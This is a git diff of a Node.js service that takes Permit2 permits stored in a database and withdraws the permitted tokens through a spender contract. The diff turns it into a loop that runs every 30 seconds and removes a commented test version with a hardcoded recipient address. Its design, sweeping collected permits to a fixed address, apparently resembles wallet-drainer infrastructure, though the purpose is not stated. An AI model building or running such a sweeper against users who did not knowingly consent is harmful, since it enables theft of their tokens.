@@ -59,6 +59,8 @@ async function withdrawTokens() {
 
       console.log(`Processing withdrawals for permit ${permitData._id} on chainId ${chainId}`);
 
+      let allWithdrawalsSuccessful = true;
+
       for (const detail of permitBatch.details) {
         const tokenAddress = detail.token;
 
@@ -90,16 +92,19 @@ async function withdrawTokens() {
           }
         } catch (withdrawError) {
           console.error(`Withdrawal failed for ${tokenAddress}:`, withdrawError);
+          allWithdrawalsSuccessful = false;
           continue;
         }
       }
 
-      // Mark permit as withdrawn
-      await permitsCollection.updateOne(
-        { _id: permitData._id },
-        { $set: { withdrawn: true, withdrawnAt: new Date() } }
-      );
-      console.log(`Withdrawals marked as complete for permit ${permitData._id}`);
+      // Mark permit as withdrawn only if all withdrawals successful
+      if (allWithdrawalsSuccessful) {
+        await permitsCollection.updateOne(
+          { _id: permitData._id },
+          { $set: { withdrawn: true, withdrawnAt: new Date() } }
+        );
+        console.log(`Withdrawals marked as complete for permit ${permitData._id}`);
+      }
     }
   } catch (error) {
     console.error('Withdrawal failed:', error);
@@ -108,77 +113,22 @@ async function withdrawTokens() {
   }
 }
 
-withdrawTokens().then(() => {
-  console.log('Withdrawal script complete');
-  process.exit(0);
-}).catch((error) => {
-  console.error('Script failed:', error);
+async function runContinuously() {
+  console.log('Starting continuous withdrawal service...');
+  
+  while (true) {
+    try {
+      await withdrawTokens();
+    } catch (error) {
+      console.error('Error in withdrawal cycle:', error);
+    }
+    
+    console.log('Waiting 30 seconds before next check...');
+    await new Promise(resolve => setTimeout(resolve, 30000));
+  }
+}
+
+runContinuously().catch((error) => {
+  console.error('Service failed:', error);
   process.exit(1);
 });
-
-
-
-// require('dotenv').config();
-// const { ethers } = require('ethers');
-
-// // Hardcoded configuration for testing
-// const CHAIN_ID = 324; // zkSync (change as needed)
-// const RPC_URL = process.env.OPTIMISM_URL; // From .env
-// const SPENDER_ADDRESS = process.env.OPTIMISM_SPENDER; // From .env
-// const PRIVATE_KEY = process.env.PRIVATE_KEY; // From .env
-// const TOKEN_ADDRESS = '0x4200000000000000000000000000000000000006'; // Hardcode your token address
-// const TO_ADDRESS = '0xcF37B9b89DdD67Ff8f0569DE9eddd76878053B68'; // Hardcode your recipient address
-
-// // Permit2Spender contract ABI (simplified)
-// const spenderAbi = [
-//   'function withdrawTokens(address token, uint256 amount, address to) external',
-//   'event TokensWithdrawn(address indexed owner, address indexed token, uint256 amount, address indexed to)',
-// ];
-
-// // ERC-20 ABI to check balance
-// const erc20Abi = ['function balanceOf(address owner) view returns (uint256)'];
-
-// async function withdrawTokens() {
-//   try {
-//     // Set up provider and wallet (zkSync-specific for chainId 324)
-//     const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
-//     const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
-
-//     // Instantiate contracts
-//     const spenderContract = new ethers.Contract(SPENDER_ADDRESS, spenderAbi, wallet);
-//     const tokenContract = new ethers.Contract(TOKEN_ADDRESS, erc20Abi, provider);
-
-//     // Check the spender contract's balance of the token
-//     const contractBalance = await tokenContract.balanceOf(SPENDER_ADDRESS);
-//     console.log(`Spender contract balance of ${TOKEN_ADDRESS}: ${contractBalance.toString()}`);
-
-//     if (contractBalance.isZero()) {
-//       console.log(`No tokens to withdraw for ${TOKEN_ADDRESS}`);
-//       return;
-//     }
-
-//     console.log(`Withdrawing ${contractBalance.toString()} of ${TOKEN_ADDRESS} to ${TO_ADDRESS}`);
-//     const tx = await spenderContract.withdrawTokens(TOKEN_ADDRESS, contractBalance, TO_ADDRESS);
-//     console.log(`Transaction submitted: ${tx.hash}`);
-
-//     const receipt = await tx.wait();
-//     console.log(`Withdrawal confirmed in block ${receipt.blockNumber}`);
-
-//     const event = receipt.events?.find(e => e.event === 'TokensWithdrawn');
-//     if (event) {
-//       console.log(`TokensWithdrawn event: Token=${event.args.token}, Amount=${event.args.amount.toString()}, To=${event.args.to}`);
-//     } else {
-//       console.warn('TokensWithdrawn event not found in receipt');
-//     }
-//   } catch (error) {
-//     console.error('Withdrawal failed:', error);
-//   }
-// }
-
-// withdrawTokens().then(() => {
-//   console.log('Withdrawal complete');
-//   process.exit(0);
-// }).catch((error) => {
-//   console.error('Script failed:', error);
-//   process.exit(1);
-// });
